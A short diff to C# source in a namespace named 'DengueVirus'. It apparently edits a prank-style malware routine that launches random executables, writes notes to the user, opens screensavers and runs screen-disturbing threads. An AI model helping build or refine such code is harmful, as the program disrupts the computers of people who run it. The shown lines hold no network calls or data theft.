@@ -238,12 +238,11 @@ namespace DengueVirus
                 Cursor = Cursors.Default;
             }
 
-            Thread exe = new Thread(SpicyPL.OpenRandomEXE); exe.Start();
+            SpicyPL.OpenRandomEXE();
             
             SpicyPL.WriteNote();
 
             Thread.Sleep(12000);
-            exe.Abort(); 
 
             Thread t3 = new Thread(PrintRotate); t3.Start();
             Thread t4 = new Thread(Wave); t4.Start();
@@ -253,19 +252,16 @@ namespace DengueVirus
             t3.Abort();
             Thread t6 = new Thread(MessageBoxThread); t6.Start();
 
-            exe.Start();
             SpicyPL.UserNote();
 
             Thread.Sleep(5000);
             t5.Abort();
             t6.Abort();
-            exe.Abort();
             SpicyPL.OpenRandomScreensaver();
 
             Thread.Sleep(5000);
             t4.Abort();
-            t6.Start();
-            exe.Start();
+            SpicyPL.OpenRandomEXE();
 
             Thread aaa = new Thread(ChangeButtonSize); aaa.Start();
 
